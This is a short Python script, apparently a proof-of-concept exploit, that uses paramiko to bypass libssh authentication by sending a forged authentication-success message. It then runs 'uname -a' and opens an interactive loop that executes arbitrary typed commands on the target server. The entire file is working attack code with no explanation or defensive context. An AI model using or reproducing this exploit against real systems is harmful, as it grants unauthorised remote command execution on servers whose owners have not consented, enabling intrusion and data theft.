#!/usr/bin/env python3
import paramiko
import socket
import sys

def wile(hostname, port):
    while True:
        try:
            s = socket.socket()
            cmd = input('[+] cmd >> ')
            if cmd == 'exit': break
            s.connect((hostname, int(port)))
            m = paramiko.message.Message()
            t = paramiko.transport.Transport(s)
            t.start_client()
            m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
            t._send_message(m)
            c = t.open_session(timeout=5)
            c.exec_command(cmd)
            out = c.makefile('rb', 2048)
            output = out.read()
            out.close()
            print(output)
        except socket.error:
            print('[-] Connecting to host failed.')
        except KeyboardInterrupt:
            print('\r[!] Exiting program.')
            break
        except EOFError:
            print('[!] Payload executed.')

def libssh(hostname, port):
    try:
        s = socket.socket()
        s.connect((hostname, int(port)))
        m = paramiko.message.Message()
        t = paramiko.transport.Transport(s)
        t.start_client()
        m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        t._send_message(m)
        c = t.open_session(timeout=5)
        c.exec_command('uname -a')
        out = c.makefile('rb', 2048)
        output = out.read()
        out.close()
        print(output)
        wile(hostname, port)
    except socket.error:
        print('[-] Target down or not vulnerable.')
    except EOFError:
        print('\r[!] Target vulnerable.')
        wile(hostname, port)
    except: print('[-] Target not vulnerable.')
